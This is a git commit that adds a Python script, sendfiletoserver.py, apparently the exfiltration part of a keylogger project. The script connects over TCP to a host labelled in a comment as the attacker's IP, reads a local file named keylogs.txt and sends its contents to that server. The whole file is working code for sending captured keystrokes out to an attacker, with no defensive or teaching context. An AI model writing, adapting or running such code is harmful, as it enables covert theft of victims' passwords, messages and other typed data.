26d8c8c3b387c7eb0d906c2b0e6ab0c18051d095
Sugi_b3o <vovietung@gmail.com>
2023-08-30 17:50:46 +0700

    Create sendfiletoserver.py

---
+++ sendfiletoserver.py
@@ -0,0 +1,39 @@
+
+import socket
+
+IP = "172.16.2.90" #IP ATtacker
+PORT = 4455 #Port
+ADDR = (IP, PORT)
+FORMAT = "utf-8"
+SIZE = 1024
+
+def main():
+    """ Staring a TCP socket. """
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    """ Connecting to the server. """
+    client.connect(ADDR)
+
+    """ Opening and reading the file data. """
+    file = open("keylogs.txt", "r")
+    data = file.read()
+
+    """ Sending the filename to the server. """
+    client.send("logs.txt".encode(FORMAT))
+    msg = client.recv(SIZE).decode(FORMAT)
+    print(f"[SERVER]: {msg}")
+
+    """ Sending the file data to the server. """
+    client.send(data.encode(FORMAT))
+    msg = client.recv(SIZE).decode(FORMAT)
+    print(f"[SERVER]: {msg}")
+
+    """ Closing the file. """
+    file.close()
+
+    """ Closing the connection from the server. """
+    client.close()
+
+
+if __name__ == "__main__":
+    main()
